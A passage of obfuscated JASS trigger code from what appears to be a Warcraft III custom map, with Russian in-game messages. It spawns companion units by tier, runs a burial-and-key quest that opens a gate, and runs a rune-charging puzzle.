set TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.12
set UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+12
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303050,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],255,0,255,255)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305337,4)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305338,4)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314159,4)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3R() then
set TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.09
set UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+9
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303050,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,0,255,255)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305337,3)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305338,3)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314159,3)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3S() then
set Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.06
set UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+6
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6E30354A,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,255,0,255)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303256)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41304C56,2)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3T() then
set Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.06
set UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+6
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6E303549,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,255,0,255)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303256)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314156,2)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3U() then
set Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.06
set UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+6
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6F303044,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,255,0,255)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$53303059,2)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303256)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3V() then
set TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.06
set UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+6
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303050,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,255,0,255)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305337,2)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41305338,2)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314159,2)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3W() then
set Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6F303044,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3X() then
set Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6E303549,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3Y() then
set TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303050,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3Z() then
set Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6E30354A,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3a() then
set N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303136,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3b() then
set N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.06
set UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+6
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303136,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,255,0,255)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314230,2)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$4131415A,2)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303256)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3c() then
set N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.09
set UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+9
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303136,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,0,255,255)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314230,3)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$4131415A,3)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303552)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3d() then
set N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.12
set UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+12
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303136,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],255,0,255,255)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314230,4)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$4131415A,4)
call UnitAddAbility(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41303552)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3e() then
set UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303135,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3f() then
set UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+6
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303135,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,255,0,255)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314232,2)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314231,2)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314156,2)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3g() then
set UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+9
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303135,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,0,255,255)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314232,3)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314231,3)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314156,3)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B3h() then
set UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+12
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303135,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],255,0,255,255)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314232,4)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314231,4)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314156,4)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
endfunction
function B3j takes nothing returns nothing
set is=CreateTrigger()
call TriggerRegisterEnterRectSimple(is,z)
call TriggerAddCondition(is,Condition(function B3J))
call TriggerAddAction(is,function B3i)
endfunction
function B3k takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B3l takes nothing returns nothing
call IssueTargetOrderBJ(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],"smart",GetOrderTargetUnit())
endfunction
function B3m takes nothing returns nothing
set it=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(it,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(it,Condition(function B3k))
call TriggerAddAction(it,function B3l)
endfunction
function B3n takes nothing returns boolean
if UnitHasBuffBJ(MT[GetPlayerId(GetOwningPlayer(GetKillingUnit()))],$42303446)==true then
return true
endif
if UnitHasBuffBJ(MT[GetPlayerId(GetOwningPlayer(GetKillingUnit()))],$42303852)==true then
return true
endif
return false
endfunction
function B3o takes nothing returns boolean
if not B3n() then
return false
endif
return true
endfunction
function B3p takes nothing returns boolean
return IsUnitAlly(GetFilterUnit(),Player(0))==true
endfunction
function B3q takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())+GetUnitStateSwap(UNIT_STATE_MAX_LIFE,GetTriggerUnit())/20.)
endfunction
function B3r takes nothing returns nothing
set V0=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(600.,V0,Condition(function B3p))
call ForGroupBJ(SR,function B3q)
call AddSpecialEffectLocBJ(V0,"Units\\NightElf\\Wisp\\WispExplode.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call RemoveLocation(V0)
call DestroyGroup(SR)
endfunction
function B3s takes nothing returns nothing
set iu=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(iu,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(iu,Condition(function B3o))
call TriggerAddAction(iu,function B3r)
endfunction
function B3t takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B3u takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304D30)==true) then
return false
endif
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304D33)==true) then
return false
endif
return true
endfunction
function B3v takes nothing returns nothing
if B3u() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D30))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D33))
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Душа Чака нашла свой покой. В награду Духи отдали вам какой-то ржавый ключ..
")
call CreateItemLoc($49304D31,GetRectCenter(EW))
else
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Отличное место для похорон.")
endif
endfunction
function B3w takes nothing returns nothing
set iv=CreateTrigger()
call TriggerRegisterEnterRectSimple(iv,EW)
call TriggerAddCondition(iv,Condition(function B3t))
call TriggerAddAction(iv,function B3v)
endfunction
function B3x takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304D31)==true) then
return false
endif
return true
endfunction
function B3y takes nothing returns nothing
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D31))
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Добро пожаловать в |c00ff6969рунную долину!")
call ModifyGateBJ(bj_GATEOPERATION_OPEN,Hp)
endfunction
function B3z takes nothing returns nothing
set iw=CreateTrigger()
call TriggerRegisterEnterRectSimple(iw,EX)
call TriggerAddCondition(iw,Condition(function B3x))
call TriggerAddAction(iw,function B3y)
endfunction
function B30 takes nothing returns boolean
if not (GetSpellAbilityId()==$41305459) then
return false
endif
return true
endfunction
function B31 takes nothing returns boolean
if not (TF==1) then
return false
endif
return true
endfunction
function B32 takes nothing returns boolean
if not (RectContainsUnit(ES,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B33 takes nothing returns boolean
if not (TF==2) then
return false
endif
return true
endfunction
function B34 takes nothing returns boolean
if not (RectContainsUnit(EP,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B35 takes nothing returns boolean
if not (TF==3) then
return false
endif
return true
endfunction
function B36 takes nothing returns boolean
if not (RectContainsUnit(EU,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B37 takes nothing returns boolean
if not (TF==4) then
return false
endif
return true
endfunction
function B38 takes nothing returns boolean
if not (RectContainsUnit(EQ,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B39 takes nothing returns boolean
if not (TF==5) then
return false
endif
return true
endfunction
function B4B takes nothing returns boolean
if not (RectContainsUnit(ER,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4C takes nothing returns boolean
if not (TF==6) then
return false
endif
return true
endfunction
function B4D takes nothing returns boolean
if not (RectContainsUnit(EV,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4E takes nothing returns boolean
if not (TF==7) then
return false
endif
return true
endfunction
function B4F takes nothing returns boolean
if not (RectContainsUnit(ET,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function B4G takes nothing returns nothing
if B32() then
if B31() then
set TF=2
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ES),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B34() then
if B33() then
set TF=3
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EP),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B36() then
if B35() then
set TF=4
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EU),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B38() then
if B37() then
set TF=5
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EQ),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4B() then
if B39() then
set TF=6
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(ER),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
else
endif
if B4D() then
if B4C() then
set TF=7
call CreateNUnitsAtLoc(1,$68303436,Player(11),GetRectCenter(EV),bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"chainlightning",JX)
call AddSpecialEffectTargetUnitBJ("origin",GetTriggerUnit(),"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call CreateTextTagUnitBJ("Продолжать заряжать руны!",JX,0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set TF=1
call CreateTextTagUnitBJ("Начинай заново, неудачник!",JX,0,15.,100.,0.,100.,0)
